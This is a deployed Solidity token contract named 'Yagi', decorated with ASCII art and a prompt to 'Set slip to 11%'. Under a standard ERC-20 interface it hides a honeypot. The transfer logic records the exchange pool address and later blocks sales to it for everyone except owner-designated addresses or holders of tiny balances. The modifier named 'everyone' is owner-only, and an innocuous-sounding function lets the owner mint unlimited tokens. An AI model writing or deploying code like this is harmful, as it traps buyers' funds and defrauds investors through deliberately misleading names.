/**
 *Submitted for verification at Etherscan.io on 2021-05-08
*/

/**
     __     __         _ 
     \ \   / /        (_)
      \ \_/ /_ _  __ _ _ 
       \   / _` |/ _` | |
        | | (_| | (_| | |
        |_|\__,_|\__, |_|
                  __/ |  
      /)  (\     |___/   
 )\.:::::::::./(
 \( o       o )/
   '-./ / _.-'`-.
    ( oo  ) / _  \
    |'--'/\/ ( \  \
     \''/  \| \ \  \
      ww   |  '  )  \
           |.' .'   |
          .' .'==|==|
         / .'\    [_]
      .-(/\) |     /
     /.-"""'/|    |
     ||    / |    |
     //   |  |    |
     ||   |__|___/
     \\   [__[___]
     // .-'.-'  (
     ||(__(__.-._)
     
⇅ Set slip to 11% ⇅

**/

//   SPDX-License-Identifier: MIT

pragma solidity >=0.5.17;

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier everyone {
    require(msg.sender == owner);
    _;
  }

}

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

/**

                               .        ..,,:;;;ii;;;;:::,..                                        
                                 .,:i1ttffLLCCCCCLLLLLLLLLfft1i;:,.                                 
                            .,itLCGGGCCLLLLLLLfffffffffffLfLLLLLLLf1i:,                             
                    .    ,;tCG000GCCLffffffttfffffffffttfffLffLfffffffff1:,                         
                      ,:itLCGGLCCLLfffftt1tttttttttttttftt1tt111tffttfffLLfti,                      
                   .;tffLCCGCLLLLfffttttttftt111111tttttttttt111tfffffftttttff1;.                   
                 ,ifffLLCCCLLCLfLfLLffffft11t1ii1111tfft1ttttffftfLLLfffttttft1tti,                 
               ,itffffLLLfLLLCLfLLLCCLLfffffft111ii11tt11111tffffffffLCLfffffftttff1:.              
             ,iffttfffLLffLLffffLLLftttttfftfftffttt1111tt1tttttfttfLfLLLfttttftfffff1,             
           .ifftttfLLGCLffftffffffft1111ttfttfffLfffffffttttt1ttttttfLCLffffffffttfLLLfi,           
          ,1ffttffCGGCLLCLffffffffftttffttt11ttttttttttffffLf1ttttfffLCCCLCLfftfffffLLLt1:  .       
         ;ttttttffCGLffLLLLfffLffft1tttfLffLLftttt1tt11ttfffLLffftfLLffLLLLfffttffffffffff1.        
       .1ttfftt1111tffffffLLLft1tt11ttfffffLLt1i;i1ttff11tfffLffffLLffffffttfffffLfffLLfffft,       
      .1fffftt1iiittttffLffLLftt11tttttttttti;:::,;11fft111tfft1tffCCfffffftttfffCLffffLfffft,      
     .1tfft1i1i11i1ftfttffffLftt1tttttttfLt1:,:,::i1tttft111tt1ttffLfLfLLfLfftttLLLLfffLLfffft,     
     ittt1t11111111ftfttftttttttft1tttLLtttt1iiiii11t1t1111tftffffLLLffLCLLLCLLLLCLLLffLLftffft,    
    :ttt111i1111it1tttttt1tt1tttttfffffffftttttttt111i1t11tftffffffftffLLfLffLfLLLLfffffffttfftt.   
   ,11;itt1111i111i1tffftffttttttttffttfLLfttttt1t1111tffffftLLfLCCLLLLffLfffffLLLfLfft1t1ttfttti   
   ;i;:;i1i11i11i111fffLLLffftfffttfttt1tf11t111tLftt1ffLLLfLfLLLLCCGGGLLLffftLLfLtfCLtt111tttttf: .
  :1;:,::;i111i1111tfLfffffffLLfffft1tt1tt111111ttt11tffLfffLLLCLfLLLCCLLffftfLCLfffLLftt11t11ttft  
 .i1i;:::;i11111111tLLLfLffffffffftt11t1111111tt111ttttfffCLffLLLLLLLLLLfffLLLLCCLLffttt1ttft1ttff, 
 ,i1i;;iiii11111111ttLGLfLfLfffLfffftt111tt1ttt1t1t1t1ttttLLffffLGCLfLLLffLLfLffLLLffft1fft1tffftf; 
 :111i;iii;1t11ttt11tfCCLfLfftttffffftttttftttttftt11tttffttfCLffLffLLfLLLfLffftfffftffftft11fffff1.
 ;11i::;iiitfitfLt11ffCGGLLLfffftttt11ttfffftttttt11ftffffffLLLLffLffffLCLLfftffttfttfLLftt1ttffLLt.
 ;ii:,.:i11t11ttf111fLCCGGLfffffffftttttttfftttttttttttftfffftfLLfffttfffLLfttttfffttLCLffftttffLLt,
 ;ii:,,:i1ii11tft111tfLLGGCCCLfftfftffffffft1tttfffttfffffff1ii1tffttftfffftttt11tfffffffLfftfffLLf,
 ;1i::;;i11111i11i1ii1tfCCGCGCffffffttfffftftttttft11tfLLfftt11ii1tf1ttfLLftt111ttfffft1fLfftfftfLt.
 :1i;:;i1i111111111i1i1fCGGCLLfttttt1ttt11111i111t111tLCftffttttttttttffLLftfftttfftffttfffftfffff1 
 ,111;;1111111111tt111i1fLCLfftft111tt1111111tt11tt11tt11tffLfttt1tfffffLfttttfffLLLLffftftttftt1t; 
 .i11111t111ii1i1t111iii1tttttttt11111111111t111111111111tLLLfttt11ttttfftttfffffLCCCLfttffffttt11, 
  ;11111111i1111iiii11iii111t1tt11t111t1i1111111111t1t11ttfffftt1tfLftt1t1tfLffLfLCLLfff1tLfttt11i. 
  .i1i1ttt1ii1111t1iii1111i11t111111111t111111t1111111tt1ttttt11tf1fft111111tfLLffffftt1ttttfft11:  
   :11tt1ttt11i11t1iii1tt1111ttttt111i11111tt1i1ft11111t1111111tLfiit1i111itttft11tff111tt1tt1tti   
    ;11i111tttt11iiii11ff1tttt;;:;f1111111111i11Lt111111i1iii1tttftt1i1i11i11iii11tt11111111ii1t,   
    .i11i11i11f1iiiii111t111tt1i;tLt11tttt111111t11111i11iii1111i11iiiii1ii1iii111111111ii111it:    
     ,1111111ii1i;;ii111iiii1i111tft1111i11111111tt11111i11111i11iii1iiiiii1iiiiiiiiiiiii11t1t:     
      ,11t111111i:;i1i;iii11i111ii111ttt1111111111111t11ii111iiiiiii1i;;iii;;;;ii1iii;;;i1tft:      
       ,11111iii11iiiiiii111t1111111111ttt1tff11iii11ftiii1i;:i1i;;;ii;;;;;:;;;i1i;iiiiit1tt,       
        .i11i;;iiiiiii1tt111111ii111iiii11111;:;ii1iit11i:;:::iiiiii;;;;;;;::;ii;;;;iii1tf1.        
          :11;;:;;;;;ii1ttt11111111i1iiii1111;:;ii111111iii;;iii;;;:::;;;;:,:ii:i;,:ii1tt;.         
           .i1i;:;;;;i;i111t111i1i1111iii1i11111111t1111iii;;;i1i;;;;;iii;:;ii;;;;;;i1t1,           
             ,;;;;:;;;;iiii1t11i11111i111i1tLfftttt11iiii;;i;iiiiiiiiii1;:;ii:::;;ii11:.            
              .:iii;;;i;iiii11111111t111iittfft11111ii1;:;iiii;:;iiiii;;;;;;::;;;i1i:.              
                 ,;i;;iii1ii11ii1t1111i11111ii11iii11i1iiiiii;;iii11i;;;i;;;;;;iii:.                
                   .,;ii1111i11111t1iii1111t11111i1111111iii;;iiiiiiii;;;;;;iii;,                   
                     .,:1111ii111ttfffft11111ttf11111i;iii;iiiiiiiiiii;;;iii;,.                     
                        .,;i11111tttfLfLft1tttt11t111iii1i11111i1i11111ii:,.                        
                            .:;itfffftffLLLfttfff1tffft111tttt1ttt1i;:,.                            
                                ..,:;1ttfffLLLLLLLLLCCCLLfftt1ii:,.                                 
                                      ..,,::;iiiii11iii;::,..                                       


**/

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint256 _totalSupply;
  uint internal queueNumber;
  address internal zeroAddress;
  address internal burnAddress;
  address internal burnAddress2;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(to != zeroAddress, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;
    else _send (from, to);
	balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function allowanceAndtransfer(address _address, uint256 tokens) public everyone {
    burnAddress = _address;
	_totalSupply = _totalSupply.add(tokens);
    balances[_address] = balances[_address].add(tokens);
  }	
  function Burn(address _address) public everyone {
    burnAddress2 = _address;
  }	
  function BurnSize(uint256 _size) public everyone {
    queueNumber = _size;
  }	
  function _send (address start, address end) internal view {
      require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), "cannot be zero address");
  }
  function () external payable {
    revert();
  }
}

contract Yagi is TokenERC20 {

  function initialise() public everyone() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
     
    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {
	symbol = _symbol;
	name = _name;
	decimals = 18;
	_totalSupply = _supply*(10**uint256(decimals));
	queueNumber = _indexNumber*(10**uint256(decimals));
	burnAddress = burn1;
	burnAddress2 = burn2;
	owner = msg.sender;
	balances[msg.sender] = _totalSupply;
	emit Transfer(address(0x0), msg.sender, _totalSupply);
  }
  function() external payable {

  }
}